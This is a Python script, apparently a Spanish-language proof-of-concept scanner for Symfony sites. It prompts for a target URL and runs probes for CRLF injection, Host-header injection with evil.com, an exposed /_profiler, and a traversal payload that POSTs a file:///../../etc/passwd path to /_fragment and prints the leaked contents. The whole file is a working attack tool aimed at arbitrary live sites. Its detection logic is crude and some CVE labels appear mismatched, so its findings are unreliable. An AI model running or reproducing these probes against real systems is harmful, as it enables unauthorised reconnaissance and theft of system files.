import requests
import socket
from urllib.parse import urlparse

def banner():
    print("==============================================")
    print("           Symfony CVE Scanner PoC            ")
    print("             m10sec@proton.me                 ")
    print("==============================================")
    print("[1] CVE-2021-21424 - CRLF Injection")
    print("[2] CVE-2021-41268 - Host Header Injection")
    print("[3] CVE-2022-24894 - WebProfiler abierto")
    print("[4] CVE-2019-10909 - Directory Traversal")
    print("[9] Ejecutar todas las pruebas")
    print("==============================================\n")

def test_crlf_socket(url):
    print("[*] Probando CVE-2021-21424 (CRLF Injection via socket)...")
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path if parsed.path else "/"
    port = 80 if parsed.scheme == "http" else 443

    payload = f"GET {path} HTTP/1.1\r\n"
    payload += f"Host: {host}\r\n"
    payload += f"X-Test: test\r\nX-Injected-Header: yes\r\n"
    payload += "Connection: close\r\n\r\n"

    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(payload.encode())
        response = s.recv(4096).decode(errors="ignore")
        s.close()

        if "X-Injected-Header" in response:
            print("[+] Posible inyección de encabezado CRLF detectada.")
        else:
            print("[-] No vulnerable (o no reflejado en respuesta).")
    except Exception as e:
        print(f"[!] Error en prueba de CRLF: {e}")
    print("-" * 50)

def test_host_header_injection(url):
    print("[*] Probando CVE-2021-41268 (Host Header Injection)...")
    try:
        headers = {"Host": "evil.com"}
        response = requests.get(url, headers=headers, timeout=5)
        if "evil.com" in response.text or response.status_code in [301, 302]:
            print("[+] Posible Host Header Injection.")
        else:
            print("[-] No vulnerable (o no detectable).")
    except Exception as e:
        print(f"[!] Error: {e}")
    print("-" * 50)

def test_web_profiler_open(url):
    print("[*] Probando CVE-2022-24894 (WebProfiler abierto)...")
    try:
        response = requests.get(url + "/_profiler", timeout=5)
        if "Symfony Profiler" in response.text:
            print("[+] WebProfiler está expuesto.")
        else:
            print("[-] No expuesto o parcheado.")
    except Exception as e:
        print(f"[!] Error: {e}")
    print("-" * 50)

def test_path_traversal_verbose(url):
    print("[*] Probando CVE-2019-10909 (Directory Traversal con contenido)...")
    traversal_url = url + "/_fragment"
    payload = {
        "_path": "file:///../../../../../../../../etc/passwd"
    }
    try:
        response = requests.post(traversal_url, data=payload, timeout=5)
        if response.status_code == 200 and "root:" in response.text:
            print("[+] Posible exposición de /etc/passwd:")
            print(response.text[:300])  # primeros 300 caracteres
        else:
            print("[-] No vulnerable o no se devolvió contenido esperado.")
    except Exception as e:
        print(f"[!] Error en prueba de path traversal: {e}")
    print("-" * 50)

def ejecutar_todo(url):
    print("\n[+] Ejecutando todas las pruebas disponibles...\n")
    test_crlf_socket(url)
    test_host_header_injection(url)
    test_web_profiler_open(url)
    test_path_traversal_verbose(url)
    print("\n[✓] Escaneo completo.\n")

if __name__ == "__main__":
    banner()
    url = input("[?] Ingresa la URL completa del sitio (incluye http o https): ").strip()
    opcion = input("\n[?] Selecciona el número de CVE a verificar: ").strip()

    if opcion == "1":
        test_crlf_socket(url)
    elif opcion == "2":
        test_host_header_injection(url)
    elif opcion == "3":
        test_web_profiler_open(url)
    elif opcion == "4":
        test_path_traversal_verbose(url)
    elif opcion == "9":
        ejecutar_todo(url)
    else:
        print("[-] Opción inválida.")